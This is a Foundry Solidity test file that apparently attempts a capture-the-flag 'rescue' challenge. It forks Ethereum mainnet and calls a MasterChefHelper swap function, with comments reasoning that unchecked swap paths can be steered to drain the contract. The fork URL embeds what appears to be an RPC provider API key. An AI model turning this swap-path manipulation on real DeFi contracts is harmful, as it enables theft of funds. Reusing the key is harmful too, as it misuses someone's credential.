// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import {Setup, WETH9, MasterChefHelper} from "../src/rescue/Setup.sol";

contract ExploitRandom is Test {
    Setup s;
    MasterChefHelper mc;
    WETH9 WETH;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 poolIdUsdcWeth = 1;
    function setUp() public {
        uint256 forkId = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/kwjMP-X-Vajdk1ItCfU-56Uaq1wwhamK");
        vm.selectFork(forkId);

        s = new Setup{value: 10 ether}();
        WETH = s.weth();
        WETH.deposit{value: 10 ether}();
        mc = s.mcHelper();
    }

    function test__exploit() public {
        // 1. create fakeERC20 to be tokenIn
        // 2. tokenIn is approved
        // 3. tokenOut0 is USDC
        // 4. tokenOut1 is WETH - already has 10 WETH on it
        // 5. _swap which takes fakeERC20, tokenOut0 and amountIn/2
        // 6. same again but with tokenOut1
        // 7. _swap has 3 args tokenIn, tokenOut and amountIn which is 1/2 original amountIn
        // 8. swaps tokenIn for tokenOut using swapExactTokensForTokens - which has a path array
        // 9. path[0] is "input" and path[1] is "output". Semantically in order but no checks,
        // 10. exploitable by manipulating poolId and original tokenIn to dictate what swap paths
        // we want
        // 11. Once both swaps are done than token0 and token1 are LP'd
        //
        // So the only way capital can move out of the mcHelper is through LP'ing
        // and hopefully being able to withdraw those tokens.
        // Couple of possiblilities to explore:
        //
        // 1. FakeErc20 as tokenIn
        // 2. Spoof tokenIn as WETH
        // 3. Actually deposit with some amount of USDC
        //

        mc.swapTokenForPoolToken(poolIdUsdcWeth, address(WETH), 1, 0);
        assertTrue(s.isSolved());
    }
}
